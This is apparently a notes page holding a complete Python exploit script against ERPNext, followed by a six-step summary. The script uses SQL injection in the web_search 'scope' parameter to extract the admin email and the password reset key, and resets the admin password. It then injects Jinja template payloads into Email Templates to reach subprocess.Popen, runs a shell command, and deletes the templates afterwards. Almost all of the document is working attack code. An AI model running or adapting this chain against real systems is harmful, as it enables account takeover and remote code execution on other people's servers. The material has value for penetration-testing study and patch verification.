---
description: Python
---

# ERPNext

{% code overflow="wrap" %}
```python
import requests
import sys
import re
from datetime import datetime
import random

# -----Config-----
PROXY = "http://127.0.0.1:8080"

# -----Session setup-----
session = requests.Session()
session.proxies = {"http": PROXY, "https": PROXY}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Test connection
def init_connection_test():
    try:
        response = session.get("http://erpnext:8000/", verify=False)
        return
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return 0

# Extract admin email
def get_admin_email():
    emails = []
    payload = 'santaa_clauz" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#'
    data = {
        "cmd": "frappe.utils.global_search.web_search",
        "text": "aa",
        "scope": payload
    }
    
    response = session.post("http://erpnext:8000/", data=data, verify=False)
    json_data = response.json()

    # Loop through the "message" list and extract email-like values
    for item in json_data.get("message", []):
        route = item.get("route", "")
        match = re.match(r"[^@]+@[^@]+\.[^@]+", route)
        if match:
            emails.append(route)

    if emails:
        print("[*] Emails found:", emails)
        return emails
    else:
        print("[X] No emails found!")
        return

def password_reset(email):
    key = ""
    data = {
        "cmd": "frappe.core.doctype.user.user.reset_password",
        "user": email
    }
    response = session.post("http://erpnext:8000/", data=data)
    payload = 'santaa_clauz" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#'
    data = {
        "cmd": "frappe.utils.global_search.web_search",
        "text": "aa",
        "scope": payload
    }
    
    response = session.post("http://erpnext:8000/", data=data)
    json_data = response.json()
    for item in json_data.get("message", []):
        doctype = item.get("doctype", "")
        if doctype == email[0]:
            key = item.get("route", "")

    if key:
        print("[*] Key found:", key)
        data = {
            "key": key,
            "old_password": "",
            "new_password": "[REDACTED]",
            "logout_all_sessions": "1",
            "cmd": "frappe.core.doctype.user.user.update_password"
        }
        response = session.post("http://erpnext:8000/", data=data)
        json_data = response.json()
        if 'full_name' in json_data:
            print("[*] Password updated!")
    else:
        print("[X] No key found!")
        return
        
def ssti_execution(email, random_name):
    email = email[0]
    data = {
        'doc': '{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"' + email + '","__newname":"' + random_name + '","subject":"' + random_name + '","response":"<div>{% set string = \\"ssti\\" %}</div><div>{% set class = \\"__class__\\" %}</div><div>{% set mro = \\"__mro__\\" %}</div><div>{% set subclasses = \\"__subclasses__\\" %}</div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r }}</div>"}',
        'action': 'Save'
    }
    
    response = session.post("http://erpnext:8000/api/method/frappe.desk.form.save.savedocs", data=data)
    json_data = response.json()

    if json_data: 
        print("[*] Retrieving subclasses list")
        json_resp = ssti_load_email_template(email, random_name)
        s = json_resp["message"]["message"].strip("<div>").strip("</div>")
        class_list = []
        buffer = ""
        angle_brackets = 0  # Counter for < and >

        for char in s:
            if char == "<":
                angle_brackets += 1
            elif char == ">":
                angle_brackets -= 1
            elif char == "," and angle_brackets == 0:
                # End of current item
                class_list.append(buffer.strip())
                buffer = ""
                continue
            buffer += char

        # Add last buffer
        if buffer:
            class_list.append(buffer.strip())
            class_list = [re.sub(r"^<class '(.*)'>$", r"\1", item) for item in class_list]

        target = "subprocess.Popen"
        if target in class_list:
            index = str(class_list.index(target))
            print(f"[*] {target} found at index {index}")
        else:
            print(f"[X] {target} not found")
            return
        
        # verify popen index
        random_name2 = 'name' + str(random.randint(101, 200))
        SSTI = {
            'doc': '{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"' + email + '","__newname":"' + random_name2 + '","subject":"' + random_name2 + '","response":"<div>{% set string = \\"ssti\\" %}</div><div>{% set class = \\"__class__\\" %}</div><div>{% set mro = \\"__mro__\\" %}</div><div>{% set subclasses = \\"__subclasses__\\" %}</div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r[' + index + '] }}</div>"}',
            'action': 'Save'
        }
        print("[*] Verifying subclass index")
        response = session.post("http://erpnext:8000/api/method/frappe.desk.form.save.savedocs", data=SSTI)
        json_data = response.json()
        json_resp = ssti_load_email_template(email, random_name2)
        verify_item = json_resp["message"]["message"]
        classes = re.findall(r"<class '([^']+)'>", verify_item)
        target = "subprocess.Popen"
        if target in classes:
            print(f"[*] Confirmed {target} is at index {index}")
        else:
            print(f"[X] Index {index} is {classes}")
            for idx, cls in enumerate(class_list):
                print(f"{idx}: {cls}")
            return

        # Remote Command
        remote_cmd = 'id'
        random_name3 = 'name' + str(random.randint(201, 300))
        SSTI = {
            'doc': '{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"' + email + '","__newname":"' + random_name3 + '","subject":"' + random_name3 + '","response":"<div>{% set string = \\"ssti\\" %}</div><div>{% set class = \\"__class__\\" %}</div><div>{% set mro = \\"__mro__\\" %}</div><div>{% set subclasses = \\"__subclasses__\\" %}</div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r[' + index + '](\\"' + remote_cmd + '\\", shell=True, stdout=-1).communicate() }}</div>"}',
            'action': 'Save'
        }

        response = session.post("http://erpnext:8000/api/method/frappe.desk.form.save.savedocs", data=SSTI)
        print(f"[*] Executing remote command: {remote_cmd}")
        json_resp = ssti_load_email_template(email, random_name3)
        cmd_result = json_resp["message"]["message"].strip("<div>").strip("</div>")
        print(f"[*] {cmd_result}")
        CLEAN_UP = {
            'items': '["' + random_name + '","' + random_name2 + '","' + random_name3 + '"]',
            'doctype': 'Email Template'
        }

        response = session.post("http://erpnext:8000/api/method/frappe.desk.reportview.delete_items", data=CLEAN_UP)
        return
        
    else:
        print("[X] Email Template Creation Failed!")
        return

def ssti_load_email_template(email, template_name):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    SSTI = '{"modified_by":"' + email + '","creation":"2025-08-22 07:53:48.255146","response":"","doctype":"Email Template","owner":"' + email + '","idx":0,"docstatus":0,"name":"ssti","subject":"ssti-subj","modified":"' + current_time + '"}'
    data = {
        'template_name': template_name,
        'doc': SSTI,
        '_lang': ''
    }
    response = session.post("http://erpnext:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template", data=data)
    json_data = response.json()
    return json_data

def main():
    if init_connection_test():
        print("[*] Initial connection test success.")
    email = get_admin_email()
    if email:
        password_reset(email)
        random_name = 'name' + str(random.randint(1, 100))
        ssti_execution(email, random_name)
       

if __name__ == "__main__":
    main()
```
{% endcode %}

1. Exploit SQLi to get email and reset password key
2. Send request to reset password
3. Login to the application
4. Exploit SSTI to list all subclasses
5. Find the index of Popen subclass
6. Execure remote command with Popen
